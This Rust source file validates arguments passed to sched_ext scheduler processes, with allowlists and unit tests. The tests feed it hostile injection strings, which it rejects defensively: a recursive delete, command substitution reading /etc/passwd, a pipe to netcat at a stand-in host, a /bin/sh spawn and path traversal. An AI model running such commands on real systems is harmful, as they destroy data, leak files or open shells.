// SPDX-License-Identifier: GPL-2.0

use anyhow::{Context, Result};
use std::collections::HashMap;
use std::path::Path;

use crate::{config::SecurityConfig, SupportedSched};

/// Validates scheduler arguments before passing to spawned process
pub struct ArgumentValidator {
    config: SecurityConfig,
    allowlists: HashMap<String, Vec<ArgPattern>>,
}

#[derive(Debug, Clone)]
pub enum ArgPattern {
    /// Exact match: argument must equal this string
    Exact(String),
    /// Prefix match: argument must start with this prefix (e.g., "--flag")
    Prefix(String),
    /// Regex match: argument must match this pattern
    Regex(regex::Regex),
}

impl ArgumentValidator {
    pub fn new(config: SecurityConfig) -> Self {
        let mut validator = Self {
            config,
            allowlists: HashMap::new(),
        };

        // Initialize default allowlists for known schedulers
        validator.init_default_allowlists();

        validator
    }

    /// Validate a list of arguments for a given scheduler
    pub fn validate_args(&self, scheduler: &SupportedSched, args: &[String]) -> Result<()> {
        if !self.config.validate_arguments {
            log::debug!("Argument validation disabled, skipping");
            return Ok(());
        }

        // Check argument count
        if args.len() > self.config.max_arguments {
            anyhow::bail!(
                "Too many arguments: {} exceeds maximum of {}",
                args.len(),
                self.config.max_arguments
            );
        }

        // Validate each argument
        for (idx, arg) in args.iter().enumerate() {
            self.validate_single_arg(scheduler, idx, arg)
                .context(format!("Invalid argument at position {}", idx))?;
        }

        // If strict allowlist is enabled, check against allowlist
        if self.config.strict_allowlist {
            self.validate_allowlist(scheduler, args)?;
        }

        Ok(())
    }

    fn validate_single_arg(
        &self,
        _scheduler: &SupportedSched,
        idx: usize,
        arg: &str,
    ) -> Result<()> {
        // Check argument length
        if arg.len() > self.config.max_argument_length {
            anyhow::bail!(
                "Argument {} is too long: {} exceeds maximum of {}",
                idx,
                arg.len(),
                self.config.max_argument_length
            );
        }

        // Check for null bytes (injection defense)
        if arg.contains('\0') {
            anyhow::bail!("Argument {} contains null byte", idx);
        }

        // Check for shell metacharacters if it looks like potential command injection
        if self.contains_shell_metacharacters(arg) {
            log::warn!("Argument {} contains shell metacharacters: {}", idx, arg);

            // Only allow if it's a known flag pattern or numeric value
            if !self.is_safe_argument(arg) {
                anyhow::bail!(
                    "Argument {} contains potentially dangerous characters: {}",
                    idx,
                    arg
                );
            }
        }

        // Validate path arguments
        if arg.starts_with('/') || arg.starts_with("./") || arg.starts_with("../") {
            self.validate_path_argument(idx, arg)?;
        }

        Ok(())
    }

    fn contains_shell_metacharacters(&self, arg: &str) -> bool {
        // Characters that have special meaning in shells
        const METACHARACTERS: &[char] = &[
            ';', '&', '|', '`', '$', '(', ')', '<', '>', '\n', '\r', '\\', '\'', '"', '*', '?',
            '[', ']', '{', '}', '~',
        ];

        arg.chars().any(|c| METACHARACTERS.contains(&c))
    }

    fn is_safe_argument(&self, arg: &str) -> bool {
        // Flags starting with - or --
        if arg.starts_with('-') {
            return true;
        }

        // Numeric values (including negative and floating point)
        if arg.parse::<i64>().is_ok() || arg.parse::<f64>().is_ok() {
            return true;
        }

        // Alphanumeric with underscores, periods, slashes (paths)
        arg.chars()
            .all(|c| c.is_alphanumeric() || c == '_' || c == '.' || c == '/' || c == '-')
    }

    fn validate_path_argument(&self, idx: usize, path: &str) -> Result<()> {
        // Check for path traversal attempts
        if path.contains("../") {
            anyhow::bail!("Argument {} contains path traversal: {}", idx, path);
        }

        // Validate path is canonical (no . or .. components)
        let _path_obj = Path::new(path);

        // Check for suspicious paths
        let suspicious_paths = [
            "/etc/shadow",
            "/etc/passwd",
            "/root/",
            "/proc/",
            "/sys/kernel/",
        ];

        for suspicious in &suspicious_paths {
            if path.starts_with(suspicious) {
                log::warn!("Argument {} references sensitive path: {}", idx, path);
                // Don't block but log - scheduler may legitimately need access
            }
        }

        Ok(())
    }

    fn validate_allowlist(&self, scheduler: &SupportedSched, args: &[String]) -> Result<()> {
        let sched_name: &str = scheduler.clone().into();

        let allowlist = self
            .allowlists
            .get(sched_name)
            .context(format!("No allowlist defined for scheduler {}", sched_name))?;

        for arg in args {
            let mut matched = false;

            for pattern in allowlist {
                if self.matches_pattern(arg, pattern) {
                    matched = true;
                    break;
                }
            }

            if !matched {
                anyhow::bail!(
                    "Argument '{}' is not in allowlist for scheduler {}",
                    arg,
                    sched_name
                );
            }
        }

        Ok(())
    }

    fn matches_pattern(&self, arg: &str, pattern: &ArgPattern) -> bool {
        match pattern {
            ArgPattern::Exact(s) => arg == s,
            ArgPattern::Prefix(prefix) => arg.starts_with(prefix),
            ArgPattern::Regex(re) => re.is_match(arg),
        }
    }

    fn init_default_allowlists(&mut self) {
        // These are safe flags commonly used by schedulers
        // Users can override via config for stricter control

        // Common safe flags across all schedulers
        let common_flags = vec![
            ArgPattern::Prefix("--help".to_string()),
            ArgPattern::Prefix("-h".to_string()),
            ArgPattern::Prefix("--version".to_string()),
            ArgPattern::Prefix("-v".to_string()),
            ArgPattern::Prefix("--verbose".to_string()),
            ArgPattern::Prefix("--stats".to_string()),
            ArgPattern::Prefix("--monitor".to_string()),
        ];

        // scx_rusty allowlist
        self.allowlists.insert("scx_rusty".to_string(), {
            let mut patterns = common_flags.clone();
            patterns.extend(vec![
                ArgPattern::Prefix("--interval".to_string()),
                ArgPattern::Prefix("-i".to_string()),
                ArgPattern::Prefix("--slice".to_string()),
                ArgPattern::Prefix("-s".to_string()),
                ArgPattern::Prefix("-d".to_string()),
                ArgPattern::Prefix("-k".to_string()),
            ]);
            patterns
        });

        // scx_lavd allowlist
        self.allowlists.insert("scx_lavd".to_string(), {
            let mut patterns = common_flags.clone();
            patterns.extend(vec![
                ArgPattern::Exact("--performance".to_string()),
                ArgPattern::Exact("--powersave".to_string()),
                ArgPattern::Prefix("--slice-us".to_string()),
            ]);
            patterns
        });

        // scx_bpfland allowlist
        self.allowlists.insert("scx_bpfland".to_string(), {
            let mut patterns = common_flags.clone();
            patterns.extend(vec![
                ArgPattern::Prefix("-m".to_string()),
                ArgPattern::Prefix("-s".to_string()),
                ArgPattern::Prefix("-I".to_string()),
                ArgPattern::Prefix("-t".to_string()),
                ArgPattern::Prefix("-w".to_string()),
                ArgPattern::Prefix("-S".to_string()),
            ]);
            patterns
        });

        // Add allowlists for other schedulers with common flags
        for sched in &[
            "scx_cosmos",
            "scx_flash",
            "scx_p2dq",
            "scx_tickless",
            "scx_rustland",
        ] {
            self.allowlists
                .insert(sched.to_string(), common_flags.clone());
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_config() -> SecurityConfig {
        SecurityConfig {
            validate_arguments: true,
            strict_allowlist: false,
            max_arguments: 128,
            max_argument_length: 4096,
            ..Default::default()
        }
    }

    #[test]
    fn test_valid_flags() {
        let validator = ArgumentValidator::new(test_config());
        let args = vec![
            "--verbose".to_string(),
            "--interval".to_string(),
            "1000".to_string(),
        ];
        assert!(validator
            .validate_args(&SupportedSched::Rusty, &args)
            .is_ok());
    }

    #[test]
    fn test_valid_short_flags() {
        let validator = ArgumentValidator::new(test_config());
        let args = vec!["-v".to_string(), "-d".to_string()];
        assert!(validator
            .validate_args(&SupportedSched::Rusty, &args)
            .is_ok());
    }

    #[test]
    fn test_numeric_arguments() {
        let validator = ArgumentValidator::new(test_config());
        let args = vec!["--interval".to_string(), "1000".to_string()];
        assert!(validator
            .validate_args(&SupportedSched::Rusty, &args)
            .is_ok());
    }

    #[test]
    fn test_negative_numeric_arguments() {
        let validator = ArgumentValidator::new(test_config());
        let args = vec!["--value".to_string(), "-1".to_string()];
        assert!(validator
            .validate_args(&SupportedSched::Rusty, &args)
            .is_ok());
    }

    #[test]
    fn test_floating_point_arguments() {
        let validator = ArgumentValidator::new(test_config());
        let args = vec!["--ratio".to_string(), "0.5".to_string()];
        assert!(validator
            .validate_args(&SupportedSched::Rusty, &args)
            .is_ok());
    }

    #[test]
    fn test_too_many_arguments() {
        let mut config = test_config();
        config.max_arguments = 5;
        let validator = ArgumentValidator::new(config);

        let args: Vec<String> = (0..10).map(|i| format!("arg{}", i)).collect();
        assert!(validator
            .validate_args(&SupportedSched::Rusty, &args)
            .is_err());
    }

    #[test]
    fn test_argument_too_long() {
        let mut config = test_config();
        config.max_argument_length = 10;
        let validator = ArgumentValidator::new(config);

        let args = vec!["this_is_a_very_long_argument".to_string()];
        let result = validator.validate_args(&SupportedSched::Rusty, &args);
        assert!(result.is_err());
        let err_msg = result.unwrap_err().to_string();
        assert!(
            err_msg.contains("too long") || err_msg.contains("Invalid argument"),
            "Error was: {}",
            err_msg
        );
    }

    #[test]
    fn test_null_byte_rejection() {
        let validator = ArgumentValidator::new(test_config());
        let args = vec!["arg\0with\0null".to_string()];
        let result = validator.validate_args(&SupportedSched::Rusty, &args);
        assert!(result.is_err());
        let err_msg = result.unwrap_err().to_string();
        assert!(
            err_msg.contains("null byte") || err_msg.contains("Invalid argument"),
            "Error was: {}",
            err_msg
        );
    }

    #[test]
    fn test_shell_metacharacter_semicolon() {
        let validator = ArgumentValidator::new(test_config());
        let args = vec!["; rm -rf /".to_string()];
        let result = validator.validate_args(&SupportedSched::Rusty, &args);
        assert!(result.is_err());
        let err_msg = result.unwrap_err().to_string();
        assert!(
            err_msg.contains("dangerous") || err_msg.contains("Invalid argument"),
            "Error was: {}",
            err_msg
        );
    }

    #[test]
    fn test_shell_metacharacter_command_substitution() {
        let validator = ArgumentValidator::new(test_config());
        let args = vec!["$(whoami)".to_string()];
        let result = validator.validate_args(&SupportedSched::Rusty, &args);
        assert!(result.is_err());
    }

    #[test]
    fn test_shell_metacharacter_backticks() {
        let validator = ArgumentValidator::new(test_config());
        let args = vec!["`cat /etc/passwd`".to_string()];
        let result = validator.validate_args(&SupportedSched::Rusty, &args);
        assert!(result.is_err());
    }

    #[test]
    fn test_shell_metacharacter_pipe() {
        let validator = ArgumentValidator::new(test_config());
        let args = vec!["arg | nc evil.com 1234".to_string()];
        let result = validator.validate_args(&SupportedSched::Rusty, &args);
        assert!(result.is_err());
    }

    #[test]
    fn test_shell_metacharacter_ampersand() {
        let validator = ArgumentValidator::new(test_config());
        let args = vec!["arg & /bin/sh".to_string()];
        let result = validator.validate_args(&SupportedSched::Rusty, &args);
        assert!(result.is_err());
    }

    #[test]
    fn test_path_traversal_rejection() {
        let validator = ArgumentValidator::new(test_config());
        let args = vec!["--config".to_string(), "../../../etc/passwd".to_string()];
        let result = validator.validate_args(&SupportedSched::Rusty, &args);
        assert!(result.is_err());
        let err_msg = result.unwrap_err().to_string();
        assert!(
            err_msg.contains("path traversal") || err_msg.contains("Invalid argument"),
            "Error was: {}",
            err_msg
        );
    }

    #[test]
    fn test_valid_absolute_path() {
        let validator = ArgumentValidator::new(test_config());
        let args = vec!["--config".to_string(), "/etc/scx_rusty.conf".to_string()];
        assert!(validator
            .validate_args(&SupportedSched::Rusty, &args)
            .is_ok());
    }

    #[test]
    fn test_safe_flag_with_equals() {
        let validator = ArgumentValidator::new(test_config());
        let args = vec!["--interval=1000".to_string()];
        assert!(validator
            .validate_args(&SupportedSched::Rusty, &args)
            .is_ok());
    }

    #[test]
    fn test_validation_disabled() {
        let mut config = test_config();
        config.validate_arguments = false;
        let validator = ArgumentValidator::new(config);

        // Even dangerous arguments should pass when validation is disabled
        let args = vec!["; rm -rf /".to_string()];
        assert!(validator
            .validate_args(&SupportedSched::Rusty, &args)
            .is_ok());
    }

    #[test]
    fn test_strict_allowlist_accepts_valid() {
        let mut config = test_config();
        config.strict_allowlist = true;
        let validator = ArgumentValidator::new(config);

        let args = vec!["--verbose".to_string()];
        assert!(validator
            .validate_args(&SupportedSched::Rusty, &args)
            .is_ok());
    }

    #[test]
    fn test_strict_allowlist_rejects_invalid() {
        let mut config = test_config();
        config.strict_allowlist = true;
        let validator = ArgumentValidator::new(config);

        let args = vec!["--unknown-flag".to_string()];
        let result = validator.validate_args(&SupportedSched::Rusty, &args);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("not in allowlist"));
    }

    #[test]
    fn test_lavd_performance_flag() {
        let validator = ArgumentValidator::new(test_config());
        let args = vec!["--performance".to_string()];
        assert!(validator
            .validate_args(&SupportedSched::Lavd, &args)
            .is_ok());
    }

    #[test]
    fn test_lavd_powersave_flag() {
        let validator = ArgumentValidator::new(test_config());
        let args = vec!["--powersave".to_string()];
        assert!(validator
            .validate_args(&SupportedSched::Lavd, &args)
            .is_ok());
    }

    #[test]
    fn test_empty_arguments() {
        let validator = ArgumentValidator::new(test_config());
        let args: Vec<String> = vec![];
        assert!(validator
            .validate_args(&SupportedSched::Rusty, &args)
            .is_ok());
    }

    #[test]
    fn test_alphanumeric_with_underscores() {
        let validator = ArgumentValidator::new(test_config());
        let args = vec!["--mode".to_string(), "low_latency".to_string()];
        assert!(validator
            .validate_args(&SupportedSched::Rusty, &args)
            .is_ok());
    }

    #[test]
    fn test_multiple_flags_combination() {
        let validator = ArgumentValidator::new(test_config());
        let args = vec![
            "--verbose".to_string(),
            "--interval".to_string(),
            "1000".to_string(),
            "-d".to_string(),
            "--slice".to_string(),
            "5000".to_string(),
        ];
        assert!(validator
            .validate_args(&SupportedSched::Rusty, &args)
            .is_ok());
    }
}
